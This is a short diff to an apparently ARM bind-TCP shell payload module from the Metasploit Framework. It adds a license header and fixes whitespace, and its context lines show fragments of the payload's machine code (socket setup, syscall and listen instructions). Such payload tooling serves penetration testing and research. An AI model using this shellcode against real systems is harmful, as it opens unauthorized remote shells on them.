@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
 require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
@@ -29,7 +36,6 @@ module Metasploit3
 						},
 					'Payload' =>
 						[
-							   
 							# socket
 							0xe3a00002, # mov     r0, #2
 							0xe3a01001, # mov     r1, #1
@@ -47,7 +53,7 @@ module Metasploit3
 							0xe1a07407, # lsl     r7, r7, #8
 							0xe287701a, # add     r7, r7, #26
 							0xef000000, # svc     0x00000000
-	
+
 							# listen
 							0xe1a00006, # mov     r0, r6
 							0xe3a07001, # mov     r7, #1
